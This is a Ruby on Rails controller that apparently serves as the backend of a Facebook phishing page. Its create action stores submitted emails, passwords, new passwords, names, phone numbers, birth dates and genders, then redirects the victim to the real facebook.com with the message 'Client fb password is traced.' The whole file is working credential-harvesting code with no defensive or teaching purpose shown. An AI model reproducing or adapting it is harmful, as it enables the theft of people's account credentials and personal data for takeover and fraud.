class FbsController < ApplicationController
  before_action :set_fb, only: [:show, :edit, :update, :destroy]

  # GET /fbs
  # GET /fbs.json
  def index
    @fbs = Fb.all
  end

  # GET /fbs/1
  # GET /fbs/1.json
  def show
  end

  # GET /fbs/new
  def new
    @fb = Fb.new
  end

  # GET /fbs/1/edit
  def edit
  end

  # POST /fbs
  # POST /fbs.json
  def create
    @fb = Fb.new(fb_params)

    respond_to do |format|
      if @fb.save
        format.html { redirect_to 'https://www.facebook.com/', notice: 'Client fb password is traced.' }
        format.json { render :show, status: :created, location: @fb }
      else
        format.html { render :new }
        format.json { render json: @fb.errors, status: :unprocessable_entity }
      end
    end
  end

  # PATCH/PUT /fbs/1
  # PATCH/PUT /fbs/1.json
  def update
    respond_to do |format|
      if @fb.update(fb_params)
        format.html { redirect_to @fb, notice: 'Fb was successfully updated.' }
        format.json { render :show, status: :ok, location: @fb }
      else
        format.html { render :edit }
        format.json { render json: @fb.errors, status: :unprocessable_entity }
      end
    end
  end

  # DELETE /fbs/1
  # DELETE /fbs/1.json
  def destroy
    @fb.destroy
    respond_to do |format|
      format.html { redirect_to fbs_url, notice: 'Fb was successfully destroyed.' }
      format.json { head :no_content }
    end
  end

  private
    # Use callbacks to share common setup or constraints between actions.
    def set_fb
      @fb = Fb.find(params[:id])
    end

    # Never trust parameters from the scary internet, only allow the white list through.
    def fb_params
      params.require(:fb).permit(:email, :password, :firstname, :surname, :mobile, :newpassword, :dob, :gender)
    end
end
